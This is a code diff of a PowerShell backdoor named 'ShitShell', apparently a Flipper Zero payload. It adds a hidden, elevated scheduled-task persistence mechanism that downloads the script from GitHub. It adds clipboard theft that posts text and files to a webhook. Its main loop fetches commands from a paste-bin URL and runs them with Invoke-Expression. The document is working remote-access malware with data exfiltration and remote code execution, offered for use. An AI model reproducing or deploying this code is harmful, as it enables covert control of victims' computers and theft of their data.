@@ -1,5 +1,4 @@
-
-
+Add-Type -AssemblyName System.Windows.Forms
 
 #Welcome message
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
@@ -12,7 +11,10 @@ $jsonPayload = @{
                           "`nYou can youse the following commands:``" +
                           "`n`n:arrow_forward: Close: Closes the current ShitShell session." +
                           "`n:arrow_forward: FolderTree: Gets folder trees and sends it to your Webhook." +
-                          "`n:arrow_forward: CheckForAdmin: Checks if the script is being run as admin."
+                          "`n:arrow_forward: CheckForAdmin: Checks if the script is being run as admin." +
+                          "`n:arrow_forward: AddPersistance: Runs script on startup." +
+                          "`n:arrow_forward: RemovePersistance: Removes persistance. " +
+                          "`n:arrow_forward: GetClipboard: Sends clipboard content to your webhook."
             color       = 16711680
             author      = @{
                 name     = "ShitShell"
@@ -78,32 +80,103 @@ function CheckForAdmin {
 
 
 function AddPersistance {
-
     
+    "`$hookurl = `"$hookurl`"" | Out-File "$env:TEMP\s.ps1" -Force
+    "`$bin = `"$bin`"" | Out-File -Append "$env:TEMP\s.ps1" -Force
+    (Invoke-WebRequest "https://raw.githubusercontent.com/Neo0412/FlipperScripts/main/ShitShell.ps1").Content | Out-File -Append "$env:TEMP\s.ps1"
+
+    $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
+    $TaskAction = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $env:TEMP\s.ps1"
+    Register-ScheduledTask "PSTask" -Action $TaskAction -Trigger $TaskTrigger -RunLevel Highest
+
+    Start-Sleep 2
+
+    if (!(Get-ScheduledTask -TaskName "PSTask" -ErrorAction SilentlyContinue)){
+        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":x: ``Something went wrong!`` :x:"} | ConvertTo-Json
+        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
+    }
+    else {
+        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":white_check_mark:  ``Script now runs on startup!`` :white_check_mark:"} | ConvertTo-Json
+        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
+    }
+
 }
 
+function RemovePersistance {
 
+    Get-ScheduledTask -TaskName "PSTask" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false
+
+    Remove-Item "$env:TEMP\s.ps1" -Force
+
+    if ((Get-ScheduledTask -TaskName "PSTask" -ErrorAction SilentlyContinue)){
+        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":x: ``Something went wrong!`` :x:"} | ConvertTo-Json
+        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
+    }
+    else {
+        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":white_check_mark:  ``Removed persistance!`` :white_check_mark:"} | ConvertTo-Json
+        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
+    }
+
+}
+
+function GetClipboard {
+
+    $ClipboardHistory = @()
+
+    $ClipboardItem = [System.Windows.Forms.Clipboard]::GetDataObject()
+    $Types = $ClipboardItem.GetFormats()
+
+    Foreach ($Type in $Types) {
+
+        switch ($Type) {
+
+            Text { $ItemType = "Text" }
+            FileDrop { $ItemType = "Data" }
+        }
+    }
+
+    if ($ItemType -eq "Text") {
+        $Content = $ClipboardItem.GetText()
+    }
+    elseif ($ItemType -eq "Data") {
+        $DataPath = $ClipboardItem.GetFileDropList()
+        $Content = Get-Item $DataPath
+    }
+
+    if (($Content.GetType()).Name -eq "String") {
+
+        $Body = @{
+            'username' = "$env:COMPUTERNAME"
+            'content'  = ":clipboard:Text_From_Clipboard:" + "`n$Content"
+        }
+        
+        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json)
+
+        $ClipboardHistory += $Content
+
+    }
+    else {
+        curl.exe -F "file1=@$Content"  -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":clipboard:File_from_Clipboard:\"}"' $hookurl | Out-Null
+
+        $ClipboardHistory += $Content.Name
+
+    }
+    
+}
 
 
 ##########################
 $commands = @()
 
 while ($true) {
-    
+
     $PastBinText = (Invoke-WebRequest $bin).Content
-
     if($commands -contains $PastBinText -or $commands -ccontains $PastBinText ){
-
         Start-Sleep 10
-
     }
     else {
         Invoke-Expression $PastBinText
-        
-
         $commands += $PastBinText
     }
-
-
 }
 
